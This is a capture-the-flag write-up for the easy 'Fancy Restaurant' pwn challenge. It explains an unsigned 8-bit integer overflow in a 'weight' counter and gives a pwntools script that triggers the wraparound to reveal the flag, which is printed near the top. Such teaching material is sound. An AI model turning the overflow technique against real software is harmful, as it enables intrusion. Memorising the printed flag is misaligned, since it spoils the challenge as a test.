# PWN - Fancy Restaurant

**Author** : Lazar Mancic  
**Difficulty**: <font color='lightgreen'>Easy</font>  
**Description**: You've come across a suspiciously fancy restaurant. Can you go inside and see if there’s something hidden?

**External resources**:
- `pwn_fancy_restaurant.zip` - [Download](public/pwn_fancy_restaurant.zip)

**Flag**: ``SCC{l051n6_w316h7_15n'7_50_h4rd_4f73r_4ll}``

# Writeup

## Enumeration

Finding the vulnerability in this challenge is pretty straightforward. If we look at the code, there is no limit set for the variable `weight`.
```c
case 2:
    if ( energy > 4u )
    {
        puts("You are not hungry.");
    }
    else
    {
        puts("You ate something.");
        energy = 5;
        weight += 5;
    }
    break;
```

## Exploitation

The exploitation involves **overflowing** the `weight` variable by continuously adding to it until its value exceeds 255 (because the type of `weight` is an `unsigned 8-bit integer`, and the maximum value for that type is 255). Any addition beyond that will cause the value to wrap around and become less than 65.

## Solution

```py
from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or "1337")
FLAG = args.FLAG

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process("./fancy", env={"FLAG": FLAG})


def enter_restaurant():
    p.sendlineafter(b"choice> ", b"1")


def eat_something():
    p.sendlineafter(b"choice> ", b"2")


def go_jogging():
    p.sendlineafter(b"choice> ", b"3")


while True:
    p.recvuntil(b"Weight: ")
    weight = int(p.recvline())

    if weight < 65:
        enter_restaurant()
        break
    else:
        go_jogging()
        eat_something()

p.recvuntil(b"following message:\n")
flag = p.recvline().strip().decode()

print(flag)
p.close()
```